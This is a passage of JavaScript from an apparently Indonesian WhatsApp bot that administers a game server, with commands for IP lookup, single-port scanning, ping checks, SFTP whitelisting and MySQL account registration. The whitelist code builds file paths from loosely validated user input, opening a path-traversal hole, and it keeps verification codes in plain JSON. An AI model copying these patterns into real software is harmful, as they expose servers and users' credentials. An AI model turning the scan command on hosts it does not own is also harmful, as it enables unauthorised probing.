                case 'ipinfo': {
              if (!isOwner && !isStaff) return reply('Perintah ini hanya bisa digunakan oleh owner dan admin.');
              if (!text) return reply(`Kirim perintah:\n${prefix+command} [alamat IP]`)

              let ipAddress = text.trim();
              let ipApiUrl = `http://ip-api.com/json/${ipAddress}?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query`;

              try {
                  let response = await axios(ipApiUrl);
                  let ipInfo = await response.data;

                  // Menampilkan informasi alamat IP dari api
                  let result = `
*IP INFO: ${ipAddress}*

> IP: 
> [ ${ipInfo.query} ]

> Country: 
> [ ${ipInfo.country} ]

> Country Code: 
> [ ${ipInfo.countryCode} ]

> Region: 
> [ ${ipInfo.region} ]

> Region Name:
> [ ${ipInfo.regionName} ]

> City: 
> [ ${ipInfo.city} ]

> Zip: 
> [ ${ipInfo.zip} ]

> Lat:
> [ ${ipInfo.lat} ]

> Lon:
> [ ${ipInfo.lon} ]

> TimeZone: 
> [ ${ipInfo.timezone} ]

> ISP: 
> [ ${ipInfo.isp} ]

> Organization: 
> [ ${ipInfo.org} ]

> AS: 
> [ ${ipInfo.as} ]

> Mobile: 
> [ ${ipInfo.mobile ? 'Yes' : 'No'} ]

> Proxy: 
> [ ${ipInfo.proxy ? 'Yes' : 'No'} ]

> Hosting: 
> [ ${ipInfo.hosting ? 'Yes' : 'No'} ]`;

                  reply(result);
              } catch (error) {
                  console.error(error);
                  reply('Terjadi kesalahan saat mengambil informasi alamat IP dari API.');
              }
          }
          break;
                
          case 'portscan': {
              if (!isOwner && !isStaff) return reply('Perintah ini hanya bisa digunakan oleh owner dan admin.');
              if (!text) return reply(`Kirim perintah:\n${prefix+command} ip port\n\nContoh penggunaan:\n${prefix+command} 127.0.0.1 7777`)

              const [ip, port] = text.trim().split(" ");
              if (!ip || !port) return reply('Mohon berikan alamat IP dan nomor port yang valid.');          

              let sampApiUrl = `https://pablo-network-rest-api.vercel.app/API/samp/portscan?key=pablo&host=${ip}&port=${port}`;

              try {
                  let response = await axios(sampApiUrl)
                  let portscan= response.data;

                  let result = `
> ╭───「 *PORT SCAN* 」─────ఌ︎
> ├──────────────────ఌ︎
> │ *PORT:*
> │ *${port}*`;

                  if (portscan.open === true ) {
                      result += `
> │ *Port Open.*
> ├──────────────────​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​ఌ︎
> ╰─── *PabloNetwork* ────​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​ఌ︎`;
                  } else {
                      result += `
> │ *Port Close.*
> ├──────────────────​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​ఌ︎
> ╰─── *PabloNetwork* ────​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​ఌ︎`;
                  }

                   reply(result);
               } catch (error) {
                   console.error(error);
                   reply(`Unable To Connect ${ip}:${port}`);
               }
          }
          break;

          case 'pingscan': {
              if (!isOwner && !isStaff) return reply('Perintah ini hanya bisa digunakan oleh owner dan admin.');
              if (!text) return reply(`Kirim perintah:\n${prefix+command} ip|port\n\nContoh penggunaan:\n${prefix+command} 127.0.0.1 7777`)

              const [ip, port] = text.trim().split(" ");
              if (!ip || !port) return reply('Mohon berikan alamat IP dan nomor port yang valid.');          

              let sampApiUrl = `https://pablo-network-rest-api.vercel.app/API/samp/ping?key=pablo&host=${ip}&port=${port}`;

              try {
                  let response = await axios(sampApiUrl)
                  let sampping = response.data;

                  let result = `
> ╭───「 *PING SCAN* 」─────ఌ︎
> ├──────────────────ఌ︎
> │ *PING:*
> │ *${sampping.Ping}ms*
> ├──────────────────​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​ఌ︎
> ╰─── *PabloNetwork* ────​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​ఌ︎`;

                   reply(result);
               } catch (error) {
                   console.error(error);
                   reply(`Unable To Connect ${ip}:${port}`);
               }
          }
          break;
          
          case 'test00': {
              reply(`${m.sender.split('@')[0]}`)
          }
          break;

case 'wl': {
    if (!allowedGroupsWl.includes(m.chat)) {
        return reply('Perintah ini hanya bisa digunakan di grup whitelist.');
    }
    /*if (isGroup) {
        return reply('Perintah ini hanya bisa digunakan di private message.');
    }*/
    if (!text) return reply(`Kirim perintah:\n${prefix}wl [Nama_Nama]\nContoh: .wl Pablo_Satoru`);
    reply(mess.wait);

    const nama = text.trim();
    const nomorTelepon = m.sender.split('@')[0]; // Mengambil nomor telepon pengirim
    const wlFilePath = `${global.sftppath}${nama}.txt`;

    // Validasi format nama harus menggunakan underscore
    if (!/^.+_.+$/.test(nama)) {
        return reply('Nama harus menggunakan format Nama_Nama (contoh: Pablo_Satoru).');
    }

    function isToxic(name) {
        const toxicWords = require('./database/toxic.json');
        return toxicWords.some(word => name.toLowerCase().includes(word.toLowerCase()));
    }

    if (isToxic(nama)) return reply('Nama yang Anda masukkan mengandung kata-kata terlarang.');

    const wlDatabasePath = './database/wl.json';
    let database = {};

    // Memastikan wl.json ada dan bisa dibaca
    if (fs.existsSync(wlDatabasePath)) {
        try {
            database = JSON.parse(fs.readFileSync(wlDatabasePath));
        } catch (error) {
            return reply('Terjadi kesalahan saat membaca database whitelist.');
        }
    }

    // Cek apakah nomor sudah terdaftar dalam database wl.json
    if (database[nomorTelepon]) {
        return reply(`Anda sudah terdaftar dalam whitelist dengan nama "${database[nomorTelepon]}". Anda tidak bisa whitelist lagi.`);
    }

    // Cek apakah nama sudah terdaftar di server SFTP
    try {
        const sftp = new SftpClient();
        await sftp.connect({
            host: global.host,
            port: global.port,
            username: global.username,
            password: global.password,
        });

        const fileExists = await sftp.exists(wlFilePath); // Cek apakah file sudah ada di SFTP
        if (fileExists) {
            await sftp.end();
            return reply(`Nama "${nama}" sudah terdaftar di server.`);
        }

        // Jika file tidak ada, lanjutkan untuk menambahkannya ke SFTP
        await sftp.put(Buffer.from(''), wlFilePath, { mode: 0o644 });
        await sftp.append(Buffer.from(`${nama}\n`), wlFilePath);
        await sftp.end();

        // Tambahkan data ke dalam database wl.json
        database[nomorTelepon] = nama;

        // Simpan data ke dalam wl.json
        try {
            fs.writeFileSync(wlDatabasePath, JSON.stringify(database, null, 2));
        } catch (error) {
            return reply('Terjadi kesalahan saat menyimpan data ke database whitelist.');
        }

        reply(`
*Dear Warga ${global.NameServerLite} !*
 
*Pendaftaran Nama anda berhasil didaftarkan! harap gunakan nama karakter anda dibawah ini untuk Registrasi pada InGame.*
 
*Nama: ${nama}*
 
*IP:* ${global.IpServer}:${global.PortServer}
 
*©2024© ${global.NameServerFull}*`)
    } catch (error) {
        console.error(error);
        return reply('Terjadi kesalahan saat menambahkan nama ke whitelist.');
    }
}
break;

case 'unwl': {
    if (!allowedGroupsAdmin.includes(m.chat)) {
        return reply('Commands ini hanya bisa digunakan di grup admin.');
    }
    if (!isOwner && !isStaff) return reply('Perintah ini hanya bisa digunakan oleh owner dan admin.');
    if (!text) return reply(`Kirim perintah:\n${prefix}unwl [Nama]`);
    reply(mess.wait)

    const nama = text.trim();
    const wlDatabasePath = './database/wl.json';
    let database = {};
    if (fs.existsSync(wlDatabasePath)) {
        database = JSON.parse(fs.readFileSync(wlDatabasePath));
    }

    const nomorTelepon = Object.keys(database).find(key => database[key] === nama);
    const wlFilePath = `${global.sftppath}${nama}.txt`;

    try {
        const sftp = new SftpClient();
        await sftp.connect({
            host: global.host,
            port: global.port,
            username: global.username,
            password: global.password,
        });

        await sftp.delete(wlFilePath);
        await sftp.end();

        if (nomorTelepon) {
            delete database[nomorTelepon];
            fs.writeFileSync(wlDatabasePath, JSON.stringify(database, null, 2));
        }

        reply(`Nama "${nama}" berhasil dihapus.`);
    } catch (error) {
        console.error(error);
        reply('Terjadi kesalahan saat menghapus nama dari whitelist.');
    }
}
    break;

case 'daftarwl': {
    if (!allowedGroupsAdmin.includes(m.chat)) {
        return reply('Commands ini hanya bisa digunakan di grup admin.');
    }
    if (!isOwner && !isStaff) return reply('Perintah ini hanya bisa digunakan oleh owner dan admin.');
    reply(mess.wait)

    const wlDatabasePath = './database/wl.json';
    const sftp = new SftpClient();
    const wlFolderPath = global.sftppath;

    let database = {};
    if (fs.existsSync(wlDatabasePath)) {
        database = JSON.parse(fs.readFileSync(wlDatabasePath));
    }

    try {
        await sftp.connect({
            host: global.host,
            port: global.port,
            username: global.username,
            password: global.password,
        });

        // Ambil semua file di folder whitelist SFTP
        const fileList = await sftp.list(wlFolderPath);

        // Filter file whitelist (nama tanpa ekstensi ".txt")
        const whitelistNames = fileList
            .filter(file => file.name.endsWith('.txt'))
            .map(file => file.name.replace('.txt', ''));

        await sftp.end();

        // Buat daftar nama dari file SFTP dan database
        let daftarNama = 'Daftar Whitelist:\n';
        whitelistNames.forEach(name => {
            const nomor = Object.keys(database).find(key => database[key] === name);
            if (nomor) {
                daftarNama += `- ${name} (${nomor})\n`;
            } else {
                daftarNama += `- ${name} (Whitelist From Ingame)\n`;
            }
        });

        reply(daftarNama.trim());
    } catch (error) {
        console.error(error);
        reply('Terjadi kesalahan saat membaca daftar whitelist dari SFTP.');
    }
}
    break;
                
    case 'ucp': {
    if (!allowedGroupsUcp.includes(m.chat)) {
        return reply('Perintah ini hanya bisa digunakan di grup ucp.');
    }
    if (!text) return reply(`Kirim perintah:\n${prefix}ucp [NamaUCP]\nContoh: .ucp PabloSatoru`);
    const nama = text.trim();
    const nomor = m.sender.split('@')[0];

    const wlPath = './database/wl.json';
    const ucpPath = './database/dataucp.json';
    const toxicPath = './database/toxic.json';
    const mysql = require('mysql2/promise');
    const fs = require('fs');

    // Validasi hanya huruf (tanpa simbol & angka)
    if (!/^[A-Za-z]+$/.test(nama)) return reply('Nama UCP hanya boleh huruf saja tanpa angka atau simbol.');

    // Validasi kata toxic
    if (fs.existsSync(toxicPath)) {
        const toxic = JSON.parse(fs.readFileSync(toxicPath));
        const lowerNama = nama.toLowerCase();
        for (const word of toxic) {
            if (lowerNama.includes(word.toLowerCase())) {
                return reply('Nama UCP mengandung kata terlarang. Silakan gunakan nama lain.');
            }
        }
    }

    // Cek duplikasi di wl.json
    let wl = {};
    if (fs.existsSync(wlPath)) wl = JSON.parse(fs.readFileSync(wlPath));
    if (wl[nomor]) return reply('Nomor ini sudah terdaftar.');
    if (Object.values(wl).includes(nama)) return reply('Nama sudah terdaftar. Gunakan nama lain.');

    const verifycode = Math.floor(100000 + Math.random() * 900000).toString();

    try {
        const conn = await mysql.createConnection({
            host: global.hostucp,
            user: global.usernamedb,
            password: global.passworddb,
            database: global.database,
        });

        await conn.execute(
            `INSERT INTO \`${global.tableucp}\` (\`${global.rowucp}\`, \`${global.rowverify}\`, \`${global.rowdiscordid}\`) VALUES (?, ?, ?)`,
            [nama, verifycode, nomor]
        );

        await conn.end();

        // Simpan data ke dataucp.json
        let dataucp = {};
        if (fs.existsSync(ucpPath)) dataucp = JSON.parse(fs.readFileSync(ucpPath));
        const createdAt = new Date().toLocaleDateString('id-ID', {
            day: 'numeric',
            month: 'long',
            year: 'numeric',
        });
        dataucp[nomor] = { nama, verifycode, createdAt };
        fs.writeFileSync(ucpPath, JSON.stringify(dataucp, null, 2));

        // Simpan ke wl.json
        wl[nomor] = nama;
        fs.writeFileSync(wlPath, JSON.stringify(wl, null, 2));

        // Kirim pesan ke grup
        reply(`*Dear Warga ${global.NameServerFull}*\n\n*Pendaftaran Nama anda berhasil didaftarkan! harap gunakan nama karakter anda dibawah ini untuk Registrasi pada InGame.*\n\n*Nama: ${nama}*\n*IP Server:* ${global.IpServer}:${global.PortServer}\n\n*©2025 - ${global.NameServerLite}*`);

        // Kirim pesan ke private user
        pablo.sendMessage(m.sender, {
            text: `*DATA UCP ANDA*\n\n* Name: ${nama}\n* Verifycode: ${verifycode}\n* IP Server: ${global.IpServer}:${global.PortServer}\n* Created At: ${createdAt}\n\n*Note:*\n*Simpan Data Ini Untuk Melakukan Login Pada InGame Dan Jangan Pernah Menyebarkan Data Ini Kepada Orang Lain. Jika Anda Melupakan Data Ini Anda Bisa Mengetik .sendverify Untuk Mengirim Ulang Data UCP Anda.*\n\n*©2025 - ${global.NameServerLite}*`,
        });
    } catch (err) {
        console.error(err);
        return reply('Gagal menyimpan ke database.');
    }
}
break;
                
    case 'sendverify': {
    const nomor = m.sender.split('@')[0];
    const ucpPath = './database/dataucp.json';
    const fs = require('fs');

    if (!fs.existsSync(ucpPath)) return reply('Belum ada data pendaftaran ditemukan.');

    const dataucp = JSON.parse(fs.readFileSync(ucpPath));
    const data = dataucp[nomor];

    if (!data) return reply('Nomor anda belum terdaftar di sistem.');

    const { nama, verifycode, createdAt } = data;

    pablo.sendMessage(m.sender, {
        text: `*DATA UCP ANDA*\n\n* Name: ${nama}\n* Verifycode: ${verifycode}\n* IP Server: ${global.IpServer}:${global.PortServer}\n* Created At: ${createdAt}\n\n*Note:*\n*Simpan Data Ini Untuk Melakukan Login Pada InGame Dan Jangan Pernah Menyebarkan Data Ini Kepada Orang Lain. Jika Anda Melupakan Data Ini Anda Bisa Mengetik .sendverify Untuk Mengirim Ulang Data UCP Anda.*\n\n*©2025 - ${global.NameServerLite}*`,
    });

    reply('Data UCP berhasil dikirim ulang ke private chat anda.');
}
break;
                
    case 'asendverify': {
    if (!(isOwner || isStaff)) return reply('Kamu tidak memiliki izin untuk menggunakan perintah ini.');
    const nomorTarget = text.trim().replace(/[^0-9]/g, '');
    const ucpPath = './database/dataucp.json';
    const fs = require('fs');

    if (!nomorTarget) return reply(`Gunakan:\n${prefix}asendverify 628xxxxxxxxxx`);
    if (!fs.existsSync(ucpPath)) return reply('Database tidak ditemukan.');

    const dataucp = JSON.parse(fs.readFileSync(ucpPath));
    const data = dataucp[nomorTarget];

    if (!data) return reply('Nomor tersebut belum terdaftar di sistem.');

    const { nama, verifycode, createdAt } = data;

    await pablo.sendMessage(nomorTarget + '@s.whatsapp.net', {
        text: `*DATA UCP ANDA*\n\n* Name: ${nama}\n* Verifycode: ${verifycode}\n* IP Server: ${global.IpServer}:${global.PortServer}\n* Created At: ${createdAt}\n\n*Note:*\n*Simpan Data Ini Untuk Melakukan Login Pada InGame Dan Jangan Pernah Menyebarkan Data Ini Kepada Orang Lain. Jika Anda Melupakan Data Ini Anda Bisa Mengetik .sendverify Untuk Mengirim Ulang Data UCP Anda.*\n\n*©2025 - ${global.NameServerLite}*`,
    });

    reply(`Data berhasil dikirim ulang ke nomor ${nomorTarget}.`);
}
break;
                
    case 'unucp': {
    if (!(isOwner || isStaff)) return reply('Kamu tidak memiliki izin untuk menggunakan perintah ini.');
    if (!text) return reply(`Gunakan:\n${prefix}unucp [NamaUCP atau Nomor]\nContoh: .unucp PabloSatoru atau .unucp 6281234567890`);

    const input = text.trim();
    const mysql = require('mysql2/promise');
    const ucpPath = './database/dataucp.json';
    const wlPath = './database/wl.json';
    let dataucp = fs.existsSync(ucpPath) ? JSON.parse(fs.readFileSync(ucpPath)) : {};
    let wl = fs.existsSync(wlPath) ? JSON.parse(fs.readFileSync(wlPath)) : {};

    let targetNomor = null;
    let targetNama = null;
    let adaDiJson = false;

    // Jika input adalah nomor
    if (/^\d+$/.test(input)) {
        targetNomor = input;
        if (dataucp[targetNomor]) {
            targetNama = dataucp[targetNomor].nama;
            adaDiJson = true;
        } else if (wl[targetNomor]) {
            targetNama = wl[targetNomor];
            adaDiJson = true;
        }
    } else {
        // Jika input adalah nama
        targetNama = input;
        for (const [no, val] of Object.entries(dataucp)) {
            if (val.nama.toLowerCase() === targetNama.toLowerCase()) {
                targetNomor = no;
                adaDiJson = true;
                break;
            }
        }
        if (!targetNomor) {
            for (const [no, nama] of Object.entries(wl)) {
                if (nama.toLowerCase() === targetNama.toLowerCase()) {
                    targetNomor = no;
                    adaDiJson = true;
                    break;
                }
            }
        }
    }

    if (!targetNama) return reply('Nama atau nomor tidak ditemukan.');

    try {
        const conn = await mysql.createConnection({
            host: global.hostucp,
            user: global.usernamedb,
            password: global.passworddb,
            database: global.database,
        });

        const [rows] = await conn.execute(
            `SELECT * FROM \`${global.tableucp}\` WHERE \`${global.rowucp}\` = ?`,
            [targetNama]
        );

        if (rows.length === 0) {
            await conn.end();
            return reply('Data UCP tidak ditemukan di database.');
        }

        await conn.execute(
            `DELETE FROM \`${global.tableucp}\` WHERE \`${global.rowucp}\` = ?`,
            [targetNama]
        );
        await conn.end();

        if (adaDiJson && targetNomor) {
            if (dataucp[targetNomor]) delete dataucp[targetNomor];
            if (wl[targetNomor]) delete wl[targetNomor];

            fs.writeFileSync(ucpPath, JSON.stringify(dataucp, null, 2));
            fs.writeFileSync(wlPath, JSON.stringify(wl, null, 2));

            reply(`Data UCP untuk ${targetNama} (${targetNomor}) berhasil dihapus.`);
        } else {
            reply(`Data UCP untuk ${targetNama} (UCP InGame) berhasil dihapus.`);
        }
    } catch (err) {
        console.error(err);
        reply('Gagal menghapus data dari database.');
    }
}
break;

    case 'cekucp': {
    if (!(isOwner || isStaff)) return reply('Kamu tidak memiliki izin untuk menggunakan perintah ini.');
    if (!text) return reply(`Gunakan:\n${prefix}cekucp [NamaUCP atau Nomor]\nContoh: .cekucp PabloSatoru atau .cekucp 6281234567890`);

    const input = text.trim();
    const mysql = require('mysql2/promise');
    const ucpPath = './database/dataucp.json';
    const wlPath = './database/wl.json';
    let dataucp = fs.existsSync(ucpPath) ? JSON.parse(fs.readFileSync(ucpPath)) : {};
    let wl = fs.existsSync(wlPath) ? JSON.parse(fs.readFileSync(wlPath)) : {};

    let targetNomor = null;
    let targetNama = null;
    let verifycode = '-';
    let createdAt = '-';

    // Cek dari JSON
    if (/^\d+$/.test(input)) {
        targetNomor = input;
        if (dataucp[targetNomor]) {
            targetNama = dataucp[targetNomor].nama;
            verifycode = dataucp[targetNomor].verifycode;
            createdAt = dataucp[targetNomor].createdAt || '-';
        } else if (wl[targetNomor]) {
            targetNama = wl[targetNomor];
        }
    } else {
        targetNama = input;
        for (const [no, val] of Object.entries(dataucp)) {
            if (val.nama.toLowerCase() === targetNama.toLowerCase()) {
                targetNomor = no;
                verifycode = val.verifycode;
                createdAt = val.createdAt || '-';
                break;
            }
        }
        if (!targetNomor) {
